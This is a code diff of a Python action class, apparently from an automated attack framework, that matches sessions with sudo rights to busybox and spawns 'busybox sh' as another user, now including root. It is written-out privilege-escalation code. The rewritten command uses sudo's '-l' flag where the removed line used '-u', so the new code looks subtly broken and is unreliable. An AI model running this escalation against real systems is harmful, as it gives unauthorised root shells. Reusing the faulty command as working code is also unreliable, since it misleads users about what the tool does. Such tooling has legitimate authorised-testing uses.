@@ -24,10 +24,14 @@ class BusyBoxGTFO(Action):
         """
         Return expected outcome of action.
         """
-        user = pattern.get('user').get('username')
+        user = pattern.get('user')
         session = pattern.get('session')._id
         permission = pattern.get('permission')._id
-        return [f"Change user to {user} in session ({session}) with permission ({permission})"]
+        if user:
+            username = user.get('username')
+            return [f"Change user to {username} in session ({session}) with permission ({permission})"]
+        else:
+            return [f"Change to busybox session ({session}) with permission ({permission})"]
 
     def get_target_patterns(self, kg: GraphDB) -> list[Union[Pattern, MultiPattern]]:
         """
@@ -41,20 +45,26 @@ class BusyBoxGTFO(Action):
             .with_node(Entity(type='Permission', alias='permission', command='/usr/bin/busybox'))
             .combine(session)
         )
-        return kg.match(pattern).where('user.username = session.username')
+        pattern_root = session.with_edge(Relationship(type='has')).with_node(
+            Entity(type='Permission', alias='permission', command='/bin/busybox')
+        )
+        return kg.match(pattern).where('user.username = session.username') + kg.match(pattern_root).where(
+            'permission.as_user = root'
+        )
 
     def function(self, sessions: SessionManager, artefacts: ArtefactManager, pattern: Pattern) -> ActionExecutionResult:
         """
         Establish busybox session as another user.
         """
-        session = pattern.get('session')
-        session_id = session.get("id")
+        tulpa_session = pattern.get('session')
+        tulpa_session_id = tulpa_session.get('id')
         permission = pattern.get('permission')
         as_user = permission.get('as_user')
-        channel = sessions.get_session(session_id)
-        cmd = ["sudo", "-u", as_user, "busybox", "sh"]
-        output = run_command(channel, " ".join(cmd))
-        return ActionExecutionResult(command=cmd, session=session_id, stdout="\n".join(output))
+
+        live_session = sessions.get_session(tulpa_session_id)
+        cmd = f"sudo -l {as_user} busybox sh"
+        output = live_session.run_command(cmd)
+        return ActionExecutionResult(command=cmd, session=tulpa_session_id, stdout=output)
 
     def capture_state_change(
         self, kg: GraphDB, artefacts: ArtefactManager, pattern: Pattern, output: ActionExecutionResult
